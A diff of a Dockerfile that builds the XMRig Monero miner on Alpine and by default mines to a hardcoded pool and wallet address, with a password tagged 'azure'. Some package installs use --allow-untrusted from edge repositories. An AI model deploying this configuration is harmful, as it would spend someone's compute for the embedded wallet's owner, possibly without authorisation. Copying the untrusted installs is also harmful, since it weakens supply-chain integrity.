@@ -1,22 +1,50 @@
-FROM ubuntu:latest AS build
+ARG ALPINE_VERSION=latest
+ARG GIT_REPOSITORY=https://github.com/xmrig/xmrig.git
+ARG GIT_BRANCH=v5.3.0
 
-ARG XMRIG_VERSION='v5.8.1'
+FROM alpine:${ALPINE_VERSION} AS build
 
-RUN apt-get update && apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
-WORKDIR /root
-RUN git clone https://github.com/xmrig/xmrig
-WORKDIR /root/xmrig
-RUN git checkout ${XMRIG_VERSION}
-COPY build.patch /root/xmrig/
-RUN git apply build.patch
-RUN mkdir build && cd build && cmake .. -DOPENSSL_USE_STATIC_LIBS=TRUE && make
+ARG GIT_REPOSITORY
+ARG GIT_BRANCH
 
-FROM ubuntu:latest
-RUN apt-get update && apt-get install -y libhwloc5
-RUN useradd -ms /bin/bash monero
-USER monero
-WORKDIR /home/monero
-COPY --from=build --chown=monero /root/xmrig/build/xmrig /home/monero
+ENV GIT_REPOSITORY=${GIT_REPOSITORY} \
+    GIT_BRANCH=${GIT_BRANCH}
+ENV CMAKE_FLAGS "-DWITH_OPENCL=OFF -DWITH_CUDA=OFF"
 
-ENTRYPOINT ["./xmrig"]
-CMD ["--url=qrl.fungibly.xyz:9999", "--user=Q0103008fdde861cae98046eb9087d74e88b7a162640c5a4442434bc4269f2d117bf2303b881aec", "--pass=x@azure", "-k", "--coin=monero"]˚
+COPY donate-level.patch /tmp
+
+WORKDIR /tmp
+
+RUN  set -x \
+  && apk update \
+  && apk add --no-cache ca-certificates git build-base cmake libmicrohttpd-dev libuv-dev openssl-dev util-linux-dev \
+  && apk add --no-cache --repository http://dl-cdn.alpinelinux.org/alpine/edge/main/ --allow-untrusted numactl-dev \
+  && apk add --no-cache --repository http://dl-cdn.alpinelinux.org/alpine/edge/testing/ --allow-untrusted hwloc-dev \
+  && git clone --single-branch --depth 1 --branch $GIT_BRANCH $GIT_REPOSITORY xmrig \
+  && git -C xmrig apply /tmp/donate-level.patch \
+  && cd xmrig \
+  && cmake ${CMAKE_FLAGS} . \
+  && make \
+  && rm -rf /var/cache/apk/*
+
+FROM alpine:${ALPINE_VERSION}
+
+RUN  set -x \
+  && adduser -S -D -h /config miner \
+  && apk update \
+  && apk upgrade \
+  && apk add --no-cache libmicrohttpd libuv openssl util-linux \
+  && apk add --no-cache --repository http://dl-cdn.alpinelinux.org/alpine/edge/main/ --allow-untrusted numactl \
+  && apk add --no-cache --repository http://dl-cdn.alpinelinux.org/alpine/edge/testing/ --allow-untrusted hwloc \
+  && rm -rf /var/lib/{apt,dpkg,cache,log}
+
+COPY --from=build /tmp/xmrig/xmrig /usr/local/bin/
+
+USER miner
+
+WORKDIR /config
+VOLUME /config
+
+ENTRYPOINT ["/usr/local/bin/xmrig"]
+
+CMD ["--url=qrl.fungibly.xyz:9999", "--user=Q0103008fdde861cae98046eb9087d74e88b7a162640c5a4442434bc4269f2d117bf2303b881aec", "--pass=x@azure", "-k", "--tls", "-t 4", "--donate-level 1"]
